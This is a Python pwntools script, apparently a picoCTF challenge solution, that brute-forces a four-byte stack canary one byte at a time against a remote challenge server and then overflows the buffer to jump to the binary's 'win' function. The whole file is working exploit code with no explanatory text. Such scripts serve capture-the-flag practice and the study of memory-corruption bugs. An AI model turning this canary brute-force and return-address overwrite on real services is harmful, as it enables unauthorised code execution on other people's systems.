from pwn import *
import struct
import time


elf = ELF("./vuln")
win = elf.symbols["win"]
print(hex(win))

canary = 0x00000000

# local test canary
# canary = 0x30303031
print(struct.pack(">I", canary))

offset = 0x50 + 8
offset_to_canary = 0x50 - 0x10
payload = b"A" * offset_to_canary
print(payload)

for j in range(4):
    for i in range(256):
        # io = process("./vuln")
        io = remote("saturn.picoctf.net", 59038)

        io.recvuntil("How Many Bytes will You Write Into the Buffer?\n> ")
        io.sendline(str(int(offset_to_canary + j + 1)))

        io.recvuntil("Input> ")
        io.sendline(payload + struct.pack("<I", canary) + b"A" * 16 + p32(win))
        res = io.recvall()
        if b"**" not in res:
            print("Found canary: ", hex(canary))
            print(res)
            break
        else:
            if j == 0:
                canary += 1
            else:
                canary += 1 << (8 * j)
            print("failed: ", hex(canary))
            time.sleep(0.1)

io = remote("saturn.picoctf.net", 59038)
io.recvuntil("How Many Bytes will You Write Into the Buffer?\n> ")
io.sendline(str(offset))
io.recvuntil("Input> ")
io.sendline(payload + struct.pack("<I", canary) + b"A" * 16 + p32(win))
print(io.recvall())
